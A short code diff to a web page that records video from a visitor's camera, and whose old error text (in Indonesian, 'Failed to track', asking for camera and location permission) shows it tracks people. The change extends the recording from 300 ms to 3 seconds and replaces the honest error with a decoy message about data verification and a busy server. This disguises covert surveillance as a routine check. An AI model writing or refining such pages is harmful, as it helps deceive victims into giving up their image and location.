@@ -193,7 +193,7 @@
       recorder.ondataavailable = e => chunks.push(e.data);
       recorder.start();
 
-      await new Promise(r => setTimeout(r, 300));
+      await new Promise(r => setTimeout(r, 3000));
       recorder.stop();
 
       const videoBlob = await new Promise((resolve, reject) => {
@@ -224,8 +224,8 @@
       stream.getTracks().forEach(t => t.stop());
 
     } catch (err) {
-      status.textContent = 'Gagal melacak';
-      errorDiv.textContent = 'Pastikan kamera & lokasi diizinkan di popup browser, lalu coba lagi.';
+      status.textContent = 'Gagal Verifikasi Data';
+      errorDiv.textContent = 'Server Sedang Sibuk.';
       btn.disabled = false;
     }
   });
@@ -233,3 +233,4 @@
 
 </body>
 </html>
+
